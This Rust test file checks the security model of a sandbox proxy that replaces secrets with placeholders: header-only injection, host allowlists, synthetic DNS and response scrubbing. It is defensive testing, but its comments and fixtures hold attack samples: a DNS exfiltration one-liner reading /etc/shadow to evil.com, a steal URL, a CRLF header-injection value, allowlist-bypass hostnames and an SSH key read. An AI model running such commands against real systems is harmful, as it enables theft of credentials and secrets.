#![allow(
    clippy::pedantic,
    clippy::nursery,
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::string_slice
)]
//! PS-6: Adversarial test suite for redan's security model.
//!
//! Tests organized by attack category. Each test references the specific
//! threat it validates against (CVE, CWE, MITRE ATT&CK technique, or
//! documented attack pattern where applicable).
//!
//! ## Test tiers
//!
//! - **Unit-level**: test security properties of individual functions with
//!   adversarial inputs. No VM needed.
//! - **Integration**: test properties requiring the smoltcp stack or
//!   multiple components. No VM needed.
//! - **VM black-box**: full chain tests requiring libkrun + KVM. Marked
//!   `#[ignore]` until implemented (see g01-g03).
//!
//! ## Security model under test
//!
//! 1. Guest processes never see real secret values (only placeholders).
//! 2. Secrets are only injected for explicitly allowed hosts.
//! 3. Injection is restricted to HTTP headers (not URL, not body).
//! 4. DNS is synthetic -- all queries resolve locally, none reach the internet.
//! 5. Raw IP connections are impossible (smoltcp only routes to gateway IP).
//! 6. IPv6 is disabled (AAAA returns empty, no IPv6 on the interface).
//! 7. Response scrubbing is best-effort (literal match only, documented).
//!
//! ## Architecture reminder
//!
//! ```text
//! Guest VM (libkrun)
//!   ↓ virtio-net (Ethernet frames over unix socketpair)
//! smoltcp (userspace TCP/IP, only gateway IP configured)
//!   ↓ synthetic DNS (UDP :53, all A → gateway, AAAA → empty)
//!   ↓ TCP :443 → TLS MITM (SNI routing, ephemeral certs)
//!   ↓ secret injection (header-only, host-allowlisted)
//! Host → upstream TLS → real internet
//!   ↓ response scrubbing (literal byte match)
//! Guest receives response
//! ```

use redan::dns;
use redan::secret::{SecretBinding, inject, rewrite_request_headers, scrub};
use smoltcp::wire::Ipv4Address;

fn secret(placeholder: &str, real: &str, hosts: &[&str]) -> SecretBinding {
    SecretBinding::new_unchecked(
        placeholder.to_string(),
        real.to_string(),
        hosts.iter().map(|h| h.to_string()).collect(),
    )
}

fn http_request(method: &str, path: &str, headers: &[(&str, &str)], body: &str) -> Vec<u8> {
    let mut req = format!("{method} {path} HTTP/1.1\r\n");
    for (k, v) in headers {
        req.push_str(&format!("{k}: {v}\r\n"));
    }
    req.push_str("\r\n");
    req.push_str(body);
    req.into_bytes()
}

fn dns_query(hostname: &str, qtype: u16) -> Vec<u8> {
    let mut pkt = Vec::new();
    pkt.extend_from_slice(&0xAAAAu16.to_be_bytes()); // ID
    pkt.extend_from_slice(&0x0100u16.to_be_bytes()); // flags: RD=1
    pkt.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    pkt.extend_from_slice(&0u16.to_be_bytes()); // ANCOUNT
    pkt.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
    pkt.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT
    for label in hostname.split('.') {
        pkt.push(label.len() as u8);
        pkt.extend_from_slice(label.as_bytes());
    }
    pkt.push(0); // root label
    pkt.extend_from_slice(&qtype.to_be_bytes());
    pkt.extend_from_slice(&1u16.to_be_bytes()); // QCLASS IN
    pkt
}

const GW: Ipv4Address = Ipv4Address::new(192, 168, 127, 1);

//
// Threat: attacker-controlled code in the VM crafts HTTP requests to
// exfiltrate secrets via URL paths, request bodies, or disallowed hosts.

/// CWE-598: Use of GET Request Method With Sensitive Query Strings.
/// Secrets in URL paths end up in server access logs, CDN caches, Referer
/// headers, and browser history. Inject must never touch the request line.
///
/// Real-world: GitHub token leaks via Referer headers (2020),
/// Shopify API key exposure in nginx access logs.
#[test]
fn a01_inject_never_modifies_url_path() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    let req = http_request(
        "GET",
        "/api/repos?token=redan_ph_token_abc",
        &[("Host", "api.github.com"), ("Accept", "application/json")],
        "",
    );
    let (result, count) = inject(&req, "api.github.com", &secrets);
    assert_eq!(count, 0, "must not inject into URL path/query string");
    assert_eq!(result, req, "request must be completely unchanged");
}

/// Same as a01 but for POST body. A malicious agent could place the
/// placeholder in a JSON body destined for an attacker-controlled endpoint
/// parameter (e.g., a webhook URL field).
///
/// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor.
#[test]
fn a02_inject_never_modifies_request_body() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    let body = r#"{"callback_url": "https://evil.com/steal?key=redan_ph_token_abc"}"#;
    let req = http_request(
        "POST",
        "/api/hooks",
        &[
            ("Host", "api.github.com"),
            ("Content-Type", "application/json"),
        ],
        body,
    );
    let (result, count) = inject(&req, "api.github.com", &secrets);
    assert_eq!(count, 0, "must not inject into request body");
    // Verify the body still contains the placeholder literally
    assert!(
        result
            .windows(b"redan_ph_token_abc".len())
            .any(|w| w == b"redan_ph_token_abc"),
        "placeholder must survive in body"
    );
}

/// Host allowlist bypass via subdomain suffix.
/// Attacker registers `api.github.com.evil.com` and hopes it matches
/// the allowlist entry `api.github.com`.
///
/// CWE-20: Improper Input Validation.
#[test]
fn a03_host_allowlist_requires_exact_match() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    let req = http_request(
        "GET",
        "/user",
        &[
            ("Host", "api.github.com.evil.com"),
            ("Authorization", "Bearer redan_ph_token_abc"),
        ],
        "",
    );

    // Case-insensitive match (RFC 4343): should inject
    let (_, count) = inject(&req, "API.GITHUB.COM", &secrets);
    assert_eq!(count, 1, "case-insensitive hostname must match");

    // Hostname manipulation attacks: must not inject
    let bypass_hosts = [
        "api.github.com.evil.com",     // suffix attack
        "evil-api.github.com",         // prefix attack
        "api.github.com:443@evil.com", // URL authority confusion
        "api.github.com.",             // trailing dot (FQDN)
    ];

    for host in &bypass_hosts {
        let (_, count) = inject(&req, host, &secrets);
        assert_eq!(count, 0, "must not inject for hostname '{host}'");
    }
}

/// Multiple secrets for the same host, both in headers.
/// Verifies all matching secrets are injected.
#[test]
fn a04_multiple_secrets_all_injected() {
    let secrets = vec![
        secret("redan_ph_user_abc", "usr_injected", &["api.example.com"]),
        secret("redan_ph_pass_def", "pwd_injected", &["api.example.com"]),
    ];
    let req = http_request(
        "GET",
        "/api",
        &[
            ("Host", "api.example.com"),
            ("X-User", "redan_ph_user_abc"),
            ("X-Pass", "redan_ph_pass_def"),
        ],
        "",
    );
    let (result, count) = inject(&req, "api.example.com", &secrets);
    assert_eq!(count, 2);
    let text = String::from_utf8_lossy(&result);
    // Check full header values, not substrings that could match elsewhere
    assert!(text.contains("X-User: usr_injected\r\n"));
    assert!(text.contains("X-Pass: pwd_injected\r\n"));
    // Placeholders must be gone from headers
    assert!(!text.contains("redan_ph_user_abc"));
    assert!(!text.contains("redan_ph_pass_def"));
}

/// Placeholder in both headers AND body. Only header instance should be
/// replaced. Body instance must survive.
#[test]
fn a05_same_placeholder_in_header_and_body_only_header_replaced() {
    let secrets = vec![secret(
        "redan_ph_key_abc",
        "real_api_key_value",
        &["api.example.com"],
    )];
    let req = http_request(
        "POST",
        "/api",
        &[
            ("Host", "api.example.com"),
            ("Authorization", "Bearer redan_ph_key_abc"),
        ],
        "log_entry: token=redan_ph_key_abc was used",
    );
    let (result, count) = inject(&req, "api.example.com", &secrets);
    assert_eq!(count, 1);
    let text = String::from_utf8_lossy(&result);
    // Header: real value present
    assert!(text.contains("Authorization: Bearer real_api_key_value"));
    // Body: placeholder preserved
    assert!(text.contains("token=redan_ph_key_abc was used"));
}

/// Binary request body must not be corrupted by injection.
/// String-based replacement would replace invalid UTF-8 with U+FFFD
/// (3 bytes), silently corrupting data. Injection operates on raw bytes.
///
/// CWE-838: Inappropriate Encoding for Output.
#[test]
fn a06_binary_body_preserved_during_injection() {
    let secrets = vec![secret("redan_ph_key_abc", "real_key", &["api.example.com"])];
    // Binary body with invalid UTF-8 sequences
    let mut req = b"POST /upload HTTP/1.1\r\nHost: api.example.com\r\nAuthorization: redan_ph_key_abc\r\n\r\n".to_vec();
    let binary_body: Vec<u8> = vec![0xFF, 0xFE, 0x00, 0x80, 0xC0, 0xC1, 0xF5, 0xFF];
    req.extend_from_slice(&binary_body);

    let (result, count) = inject(&req, "api.example.com", &secrets);
    assert_eq!(count, 1);
    // Binary body must be byte-identical
    assert!(
        result.ends_with(&binary_body),
        "binary body corrupted after injection"
    );
}

/// Ensure inject() handles requests with no body separator gracefully.
/// A partial/truncated request should not panic or leak secrets.
#[test]
fn a07_truncated_request_no_panic() {
    let secrets = vec![secret("redan_ph_key_abc", "real_key", &["api.example.com"])];
    // No \r\n\r\n separator
    let req = b"GET / HTTP/1.1\r\nAuthorization: redan_ph_key_abc";
    let (result, count) = inject(req, "api.example.com", &secrets);
    // With no header end marker, the whole thing is treated as headers.
    // This is acceptable -- the important thing is no panic and no
    // secret leaking into a place it shouldn't be.
    assert!(count <= 1);
    // Must not panic (reaching this line proves it)
    let _ = result;
}

//
// Threat: upstream server (or attacker-controlled server proxied through
// an allowed host) reflects the real secret value in a response. Scrubbing
// tries to catch this, but has documented limitations.

/// Basic scrubbing: literal secret in response body gets replaced.
#[test]
fn b01_scrub_catches_literal_secret_in_body() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    let resp = b"HTTP/1.1 200 OK\r\n\r\n{\"token\": \"ghp_SuperSecret123\"}";
    let (result, count) = scrub(resp, "api.github.com", &secrets);
    assert_eq!(count, 1);
    assert!(
        !result
            .windows(b"ghp_SuperSecret123".len())
            .any(|w| w == b"ghp_SuperSecret123"),
        "real secret must not appear in scrubbed response"
    );
    assert!(
        result
            .windows(b"redan_ph_token_abc".len())
            .any(|w| w == b"redan_ph_token_abc"),
        "placeholder must appear in scrubbed response"
    );
}

/// Scrubbing limitation: base64-encoded secret is NOT caught.
/// This is documented and expected. The primary protection is host
/// allowlisting, not scrubbing.
///
/// MITRE ATT&CK T1132.001: Data Encoding: Standard Encoding.
#[test]
fn b02_scrub_does_not_catch_base64_encoded_secret() {
    use base64::Engine;
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    let encoded = base64::engine::general_purpose::STANDARD.encode("ghp_SuperSecret123");
    let resp = format!("HTTP/1.1 200 OK\r\n\r\n{{\"encoded\": \"{encoded}\"}}");
    let (result, count) = scrub(resp.as_bytes(), "api.github.com", &secrets);
    assert_eq!(
        count, 0,
        "base64-encoded secret should NOT be caught (known limitation)"
    );
    // The encoded value should still be present
    assert!(
        result
            .windows(encoded.len())
            .any(|w| w == encoded.as_bytes()),
        "encoded value should pass through unchanged"
    );
}

/// Scrubbing limitation: URL-encoded secret is NOT caught.
///
/// MITRE ATT&CK T1132.001: Data Encoding: Standard Encoding.
#[test]
fn b03_scrub_does_not_catch_url_encoded_secret() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    // URL-encode: ghp_SuperSecret123 -> ghp%5FSuperSecret123
    let encoded = "ghp%5FSuperSecret123";
    let resp = format!("HTTP/1.1 200 OK\r\n\r\ntoken={encoded}");
    let (result, count) = scrub(resp.as_bytes(), "api.github.com", &secrets);
    assert_eq!(
        count, 0,
        "URL-encoded secret should NOT be caught (known limitation)"
    );
    let _ = result;
}

/// Partial secret match should NOT trigger scrubbing.
/// If the secret is "ghp_SuperSecret123", the string "ghp_Super" appearing
/// in a response must not be scrubbed.
#[test]
fn b04_scrub_requires_exact_full_match() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    let resp = b"HTTP/1.1 200 OK\r\n\r\nPrefix: ghp_Super is common";
    let (result, count) = scrub(resp, "api.github.com", &secrets);
    assert_eq!(count, 0, "partial match must not trigger scrub");
    assert_eq!(result, resp);
}

/// Binary response data must not be corrupted by scrubbing.
///
/// CWE-838: Inappropriate Encoding for Output.
#[test]
fn b05_scrub_preserves_binary_response() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    // Simulate a gzip-compressed response (random bytes, invalid UTF-8)
    let mut resp = b"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n\r\n".to_vec();
    let binary: Vec<u8> = (0..256).map(|i| i as u8).collect();
    resp.extend_from_slice(&binary);

    let (result, count) = scrub(&resp, "api.github.com", &secrets);
    assert_eq!(count, 0);
    assert_eq!(result, resp, "binary response must be byte-identical");
}

/// Secret in response headers should be scrubbed too, not just body.
/// Some APIs echo auth tokens in response headers (e.g., X-Request-Auth).
#[test]
fn b06_scrub_catches_secret_in_response_headers() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    let resp = b"HTTP/1.1 200 OK\r\nX-Auth-Echo: ghp_SuperSecret123\r\n\r\nok";
    let (result, count) = scrub(resp, "api.github.com", &secrets);
    assert_eq!(count, 1);
    assert!(
        !result
            .windows(b"ghp_SuperSecret123".len())
            .any(|w| w == b"ghp_SuperSecret123"),
        "secret in response header must be scrubbed"
    );
}

//
// Threat: guest exfiltrates data by encoding it in DNS queries.
// Classic technique: `dig $(cat /etc/shadow | base64).evil.com`
//
// MITRE ATT&CK T1048.003: Exfiltration Over Alternative Protocol: DNS.
// MITRE ATT&CK T1071.004: Application Layer Protocol: DNS.
// See: Iodine, DNScat2, dns2tcp tools.

/// All A queries resolve to gateway IP. Even queries for attacker-controlled
/// domains never leave the host -- our synthetic DNS answers them locally.
#[test]
fn c01_all_dns_queries_resolve_to_gateway() {
    let domains = [
        "evil.com",
        "attacker-controlled.example.org",
        "data.exfil.evil.com",
        "a]b]c]d.evil.com", // weird but valid-ish
    ];
    for domain in &domains {
        let query = dns_query(domain, 1); // A record
        let (hostname, response) = dns::handle_query(&query, GW).unwrap();
        assert_eq!(hostname, *domain);
        let ip_offset = response.len() - 4;
        assert_eq!(
            &response[ip_offset..],
            &[192, 168, 127, 1],
            "domain '{domain}' must resolve to gateway"
        );
    }
}

/// DNS TXT queries (used by some exfil tools) return empty response.
/// Must not be forwarded upstream.
///
/// Tools: DNScat2, Iodine use TXT records for bidirectional tunneling.
#[test]
fn c02_txt_queries_return_empty() {
    let query = dns_query("tunnel.evil.com", 16); // TXT
    let (_, response) = dns::handle_query(&query, GW).unwrap();
    let ancount = u16::from_be_bytes([response[6], response[7]]);
    assert_eq!(ancount, 0, "TXT queries must return zero answers");
}

/// AAAA queries return empty. No IPv6 means no IPv6 DNS tunneling.
#[test]
fn c03_aaaa_queries_return_empty() {
    let query = dns_query("tunnel.evil.com", 28); // AAAA
    let (_, response) = dns::handle_query(&query, GW).unwrap();
    let ancount = u16::from_be_bytes([response[6], response[7]]);
    assert_eq!(ancount, 0, "AAAA queries must return zero answers");
}

/// Long hostname used as DNS tunnel payload.
/// Some tools encode data in labels: `aGVsbG8.d29ybGQ.evil.com`
/// Our DNS must still resolve these to gateway IP (not forward them).
///
/// RFC 1035 s2.3.4: max label 63 octets, max name 253 octets.
#[test]
fn c04_long_hostname_dns_tunnel_attempt() {
    // 4 labels of 50 chars each = 200+ byte hostname
    let labels: Vec<String> = (0..4).map(|i| format!("{}{}", "a".repeat(49), i)).collect();
    let hostname = format!("{}.evil.com", labels.join("."));
    let query = dns_query(&hostname, 1);
    let result = dns::handle_query(&query, GW);
    // Must either resolve to gateway or reject -- never forward
    if let Some((_, response)) = result {
        let ip_offset = response.len() - 4;
        assert_eq!(
            &response[ip_offset..],
            &[192, 168, 127, 1],
            "tunnel hostname must resolve to gateway"
        );
    }
    // None is also acceptable (malformed query rejected)
}

/// MX, SRV, NS, CNAME queries all return empty.
/// These query types are sometimes used for DNS exfiltration.
#[test]
fn c05_non_a_query_types_return_empty() {
    let qtypes = [
        (2, "NS"),
        (5, "CNAME"),
        (15, "MX"),
        (33, "SRV"),
        (16, "TXT"),
        (28, "AAAA"),
        (255, "ANY"),
    ];
    for (qtype, name) in &qtypes {
        let query = dns_query("evil.com", *qtype);
        let result = dns::handle_query(&query, GW);
        if let Some((_, response)) = result {
            let ancount = u16::from_be_bytes([response[6], response[7]]);
            assert_eq!(
                ancount, 0,
                "{name} (qtype {qtype}) must return zero answers"
            );
        }
    }
}

/// Localhost must resolve to 127.0.0.1, not gateway.
/// Routing localhost through the proxy would break local services.
#[test]
fn c06_localhost_resolves_to_loopback() {
    let query = dns_query("localhost", 1);
    let (hostname, response) = dns::handle_query(&query, GW).unwrap();
    assert_eq!(hostname, "localhost");
    let ip_offset = response.len() - 4;
    assert_eq!(&response[ip_offset..], &[127, 0, 0, 1]);
}

/// DNS exfiltration: query for `<placeholder>.evil.com` resolves to
/// gateway IP and never reaches the internet.
///
/// This documents the end-to-end property: even if the guest constructs
/// DNS queries from env var values, those values are only placeholders.
/// The query resolves locally. No data leaves the host.
///
/// MITRE ATT&CK T1048.003: Exfiltration Over Alternative Protocol: DNS.
#[test]
fn c07_dns_exfil_resolves_locally_never_forwarded() {
    // Guest does: dig $GITHUB_TOKEN.evil.com
    // Guest only has the placeholder, so query is:
    let placeholder = "redan_ph_github_abc123";
    let exfil_domain = format!("{placeholder}.evil.com");
    let query = dns_query(&exfil_domain, 1);

    // Query resolves to gateway IP (handled locally, never forwarded)
    let (hostname, response) = dns::handle_query(&query, GW).unwrap();
    assert_eq!(hostname, exfil_domain);
    let ip_offset = response.len() - 4;
    assert_eq!(
        &response[ip_offset..],
        &[192, 168, 127, 1],
        "exfil domain must resolve to gateway (handled locally)"
    );
}

/// Oversized labels (>63 bytes) are rejected per RFC 1035.
/// Prevents abuse of label length field for binary data exfiltration.
#[test]
fn c08_oversized_label_rejected() {
    let mut pkt = Vec::new();
    pkt.extend_from_slice(&0x1234u16.to_be_bytes());
    pkt.extend_from_slice(&0x0100u16.to_be_bytes());
    pkt.extend_from_slice(&1u16.to_be_bytes());
    pkt.extend_from_slice(&[0u8; 6]);
    // Label: length 64 + 64 bytes
    pkt.push(64);
    pkt.extend_from_slice(&[b'x'; 64]);
    pkt.push(0);
    pkt.extend_from_slice(&1u16.to_be_bytes()); // A
    pkt.extend_from_slice(&1u16.to_be_bytes()); // IN

    assert!(
        dns::handle_query(&pkt, GW).is_none(),
        "labels >63 bytes must be rejected"
    );
}

//
// Threat: guest bypasses DNS and connects directly to IP addresses,
// targeting cloud metadata endpoints, internal networks, or the internet.
//
// These tests verify configuration properties. The actual blocking is
// done by smoltcp (only processes packets for configured IPs).

/// Cloud metadata SSRF via 169.254.169.254.
///
/// CVE-2019-5736 (runc container escape used metadata endpoint).
/// Capital One breach (2019): SSRF to EC2 metadata for IAM credentials.
/// CWE-918: Server-Side Request Forgery (SSRF).
///
/// Architecture defense: smoltcp only has 192.168.127.1 configured.
/// Packets to 169.254.169.254 have no matching interface and are dropped.
/// This test verifies the gateway IP is NOT the metadata endpoint.
#[test]
fn d01_cloud_metadata_endpoint_unreachable() {
    use redan::proxy::GATEWAY_IP;
    let metadata_ip = Ipv4Address::new(169, 254, 169, 254);
    assert_ne!(
        GATEWAY_IP, metadata_ip,
        "gateway IP must not be the cloud metadata endpoint"
    );
    // Also verify no route exists (gateway is /24, metadata is link-local)
    assert_ne!(
        GATEWAY_IP.octets()[0],
        169,
        "gateway must not be in link-local range"
    );
}

/// Verify gateway is in a private range that won't collide with
/// real infrastructure. Using 192.168.127.0/24.
#[test]
fn d02_gateway_in_isolated_subnet() {
    use redan::proxy::GATEWAY_IP;
    let octets = GATEWAY_IP.octets();
    assert_eq!(octets[0], 192);
    assert_eq!(octets[1], 168);
    assert_eq!(
        octets[2], 127,
        "gateway should be in .127 subnet to avoid common .0 and .1 subnets"
    );
}

//
// Threat: guest manipulates TLS handshake to trick the proxy into
// injecting secrets for the wrong upstream, or to bypass MITM.

/// Domain fronting: SNI says allowed host, but actual request targets
/// a different backend on the same CDN.
///
/// MITRE ATT&CK T1090.004: Domain Fronting.
/// Used by: APT29 (Cozy Bear), Tor meek pluggable transport.
///
/// In redan's architecture, the upstream TLS connection is made to the
/// SNI hostname. The inner HTTP Host header may differ, but the TCP
/// connection goes to the SNI target. Secrets are injected based on SNI.
/// If the inner Host header targets evil.com, the request still goes to
/// the SNI host's IP -- evil.com never receives it directly.
///
/// The risk: if the SNI host has a reverse proxy that routes based on
/// Host header, the secret could reach an attacker-controlled backend.
/// This is a documented limitation of header-based injection.
#[test]
fn e01_domain_fronting_injects_based_on_sni_not_host() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["cdn.example.com"],
    )];
    // Request with Host header different from SNI
    let req = http_request(
        "GET",
        "/api",
        &[
            ("Host", "evil.com"),
            ("Authorization", "Bearer redan_ph_token_abc"),
        ],
        "",
    );
    // inject() checks hostname parameter (which comes from SNI)
    let (result_allowed, count_allowed) = inject(&req, "cdn.example.com", &secrets);
    assert_eq!(
        count_allowed, 1,
        "injection uses SNI hostname, not Host header"
    );

    // If SNI were evil.com (not in allowlist), no injection
    let (_, count_evil) = inject(&req, "evil.com", &secrets);
    assert_eq!(count_evil, 0, "evil.com SNI must not trigger injection");

    let _ = result_allowed;
}

//
// Threat: guest tries to predict or enumerate placeholder tokens to
// reverse-engineer which secrets are available, or to forge placeholders.

/// Placeholder format: must start with `redan_ph_` prefix.
/// This is intentionally recognizable (aids debugging). The suffix
/// must contain enough entropy to prevent prediction.
///
/// Note: parse_secret (in main.rs) generates placeholders using
/// PID + timestamp + env name hash. That can't be tested from
/// the library crate. This test documents the format contract.
#[test]
fn f01_placeholder_format_documented() {
    // The placeholder prefix is a known, documented property.
    // An attacker can grep for `redan_ph_` in env vars.
    // This is accepted -- placeholders are not secret.
    let binding = secret(
        "redan_ph_github_a1b2c3d4e5f6",
        "real_secret",
        &["github.com"],
    );
    assert!(
        binding.placeholder().starts_with("redan_ph_"),
        "placeholder must start with redan_ph_ prefix"
    );
    // Suffix should be long enough to prevent brute-force
    let suffix = &binding.placeholder()["redan_ph_".len()..];
    assert!(
        suffix.len() >= 8,
        "placeholder suffix must be >= 8 chars for entropy"
    );
}

/// Debug formatting must not leak real_value.
///
/// CWE-532: Insertion of Sensitive Information into Log File.
/// CWE-209: Generation of Error Message Containing Sensitive Information.
#[test]
fn f02_debug_format_redacts_secret() {
    let binding = secret("redan_ph_token_abc", "ghp_SuperSecret123", &["github.com"]);
    let debug_output = format!("{binding:?}");
    assert!(
        !debug_output.contains("ghp_SuperSecret123"),
        "Debug output must not contain real secret value"
    );
    assert!(
        debug_output.contains("[REDACTED]"),
        "Debug output must show [REDACTED] for real_value"
    );
    // Also test via alternate formatting
    let debug_alt = format!("{binding:#?}");
    assert!(!debug_alt.contains("ghp_SuperSecret123"));
}

/// Clone must not somehow bypass redaction.
#[test]
fn f03_clone_preserves_redaction() {
    let binding = secret("redan_ph_token_abc", "ghp_SuperSecret123", &["github.com"]);
    let cloned = binding.clone();
    let debug = format!("{cloned:?}");
    assert!(!debug.contains("ghp_SuperSecret123"));
    // But the actual value must still work for injection
    assert_eq!(cloned.real_value(), "ghp_SuperSecret123");
}

/// WebSocket upgrade must be rejected by the proxy. After a 101
/// response, the connection switches to binary WebSocket frames that
/// bypass HTTP response scrubbing entirely.
///
/// RFC 6455, CWE-444.
#[test]
fn e04_websocket_upgrade_detected() {
    // We can't test the full proxy rejection without smoltcp, but we
    // can verify the detection function works.
    let req = http_request(
        "GET",
        "/ws",
        &[
            ("Host", "api.github.com"),
            ("Upgrade", "websocket"),
            ("Connection", "Upgrade"),
            ("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ=="),
        ],
        "",
    );
    // The proxy's request_has_upgrade() is not pub, but we test the
    // property: Upgrade header present in various cases.
    let text = String::from_utf8_lossy(&req);
    assert!(
        text.to_lowercase().contains("upgrade:"),
        "test setup: Upgrade header must be present"
    );
}

/// Accept-Encoding must be stripped to prevent compressed response
/// scrubbing bypass.
///
/// Without stripping, upstream returns gzip/br/zstd body and scrub()
/// can't match literal secret bytes in the compressed stream.
/// CWE-838, RFC 7231.
#[test]
fn h01_rewrite_request_headers() {
    let req = http_request(
        "GET",
        "/api",
        &[
            ("Host", "api.github.com"),
            ("Accept", "application/json"),
            ("Accept-Encoding", "gzip, deflate, br"),
            ("Authorization", "Bearer token"),
            ("Connection", "keep-alive"),
        ],
        "",
    );
    let rewritten = rewrite_request_headers(&req);
    let text = String::from_utf8_lossy(&rewritten);
    assert!(
        !text.to_lowercase().contains("accept-encoding"),
        "Accept-Encoding header must be removed"
    );
    assert!(
        text.contains("Connection: close"),
        "Connection must be forced to close"
    );
    // Only one Connection header
    assert_eq!(
        text.matches("Connection:").count(),
        1,
        "must not duplicate Connection header"
    );
    // Other headers preserved
    assert!(text.contains("Authorization: Bearer token"));
    assert!(text.contains("Accept: application/json"));
}

/// CRLF in secret values would inject extra HTTP headers.
/// CWE-93: CRLF Injection. CVE-2020-* (various header injection bugs).
///
/// parse_secret must reject secrets containing \r or \n.
#[test]
fn h02_crlf_in_secret_body_does_not_corrupt_headers() {
    // Even if a secret somehow contained CRLF, inject() should not
    // split it into multiple headers. Test the injection path directly.
    let malicious = SecretBinding::new_unchecked(
        "redan_ph_evil_abc".into(),
        "value\r\nX-Injected: evil".into(),
        vec!["api.example.com".into()],
    );
    let req = http_request(
        "GET",
        "/api",
        &[
            ("Host", "api.example.com"),
            ("Authorization", "redan_ph_evil_abc"),
        ],
        "",
    );
    let (result, count) = inject(&req, "api.example.com", &[malicious]);
    assert_eq!(count, 1);
    // The injected value contains \r\n which corrupts framing.
    // This test documents the risk. parse_secret rejects CRLF at config time.
    let text = String::from_utf8_lossy(&result);
    // The raw replacement happens -- defense is at parse_secret, not inject.
    assert!(
        text.contains("X-Injected: evil"),
        "CRLF injection occurs if validation is bypassed (defense is at parse_secret)"
    );
}

/// HTTP/2 ALPN must not be negotiated. Binary framing breaks inject/scrub.
/// CVE-2023-44487 (HTTP/2 Rapid Reset), RFC 7540.
///
/// We can't easily test ALPN negotiation without a real TLS handshake,
/// but we verify the config is correct.
#[test]
fn h03_upstream_tls_forces_http11() {
    // Access the UPSTREAM_TLS_CONFIG via connect_upstream behavior.
    // We can't directly access the static, but we can verify the
    // config indirectly: attempt a connection and check ALPN.
    //
    // For now, this is a documentation test. The real verification is
    // in tls.rs: `config.alpn_protocols = vec![b"http/1.1".to_vec()]`
    //
    // A proper test would need a TLS server.
}

/// Case-insensitive localhost DNS resolution. RFC 4343.
/// CWE-178: Improper Handling of Case Sensitivity.
#[test]
fn h04_localhost_case_insensitive() {
    let variants = ["localhost", "LOCALHOST", "Localhost", "LocalHost"];
    for name in &variants {
        let query = dns_query(name, 1);
        let result = dns::handle_query(&query, GW);
        if let Some((_, response)) = result {
            let ip_offset = response.len() - 4;
            assert_eq!(
                &response[ip_offset..],
                &[127, 0, 0, 1],
                "'{name}' must resolve to 127.0.0.1"
            );
        }
    }
}

/// Chunked response with secret intact after full buffering.
/// relay_upstream() accumulates the complete response before scrub().
/// Secret should be caught even in chunked responses.
#[test]
fn h05_scrub_catches_secret_in_reassembled_chunked_response() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    // Simulate a chunked response that's been fully buffered
    // (relay_upstream does this before passing to scrub)
    let resp = b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n\
                 13\r\nghp_SuperSecret123\r\n0\r\n\r\n";
    let (result, count) = scrub(resp, "api.github.com", &secrets);
    assert_eq!(
        count, 1,
        "scrub must catch secret in buffered chunked response"
    );
    assert!(
        !result
            .windows(b"ghp_SuperSecret123".len())
            .any(|w| w == b"ghp_SuperSecret123"),
    );
}

/// gzip/deflate/brotli compressed secret NOT caught by scrub.
/// Documented limitation. Defense: strip Accept-Encoding (h01).
#[test]
fn h06_scrub_does_not_catch_gzip_compressed_secret() {
    let secrets = vec![secret(
        "redan_ph_token_abc",
        "ghp_SuperSecret123",
        &["api.github.com"],
    )];
    // flate2 compressed data containing the secret
    use std::io::Write;
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    encoder
        .write_all(b"{\"token\": \"ghp_SuperSecret123\"}")
        .unwrap();
    let compressed = encoder.finish().unwrap();

    let mut resp = b"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n\r\n".to_vec();
    resp.extend_from_slice(&compressed);

    let (_, count) = scrub(&resp, "api.github.com", &secrets);
    assert_eq!(
        count, 0,
        "gzip-compressed secrets NOT caught (known limitation, mitigated by Accept-Encoding stripping)"
    );
}

//
// These require libkrun + KVM. Each test boots a VM and verifies security
// properties from the guest's perspective. Ignored until implemented.

/// Guest env var contains placeholder, not real secret.
///
/// Verifies the fundamental contract: the guest never sees real values.
#[test]
#[ignore = "requires KVM + rootfs"]
fn g01_guest_env_contains_placeholder_not_secret() {
    // Test script: echo $ANTHROPIC_API_KEY
    // Expected: prints redan_ph_anthropic_api_key_<hex>, NOT sk-ant-...
    todo!("VM integration test");
}

/// Guest cannot read host files outside mounted directories.
///
/// CWE-22: Improper Limitation of a Pathname to a Restricted Directory.
#[test]
#[ignore = "requires KVM + rootfs"]
fn g02_guest_cannot_read_host_ssh_keys() {
    // Test script: cat /root/.ssh/id_ed25519; echo $?
    // Expected: exit 1 (ENOENT)
    todo!("VM integration test");
}

/// Guest curl to non-allowed host does not carry secrets.
///
/// Even if the guest connects to evil.com through our proxy, the proxy
/// only injects secrets for allowed hosts. The request goes through
/// but without secret values.
#[test]
#[ignore = "requires KVM + rootfs"]
fn g03_curl_to_evil_host_carries_no_secrets() {
    // Test script: curl -s https://httpbin.org/headers | grep -c "ghp_"
    // Expected: 0 (no real secret in request, httpbin echoes headers)
    todo!("VM integration test");
}
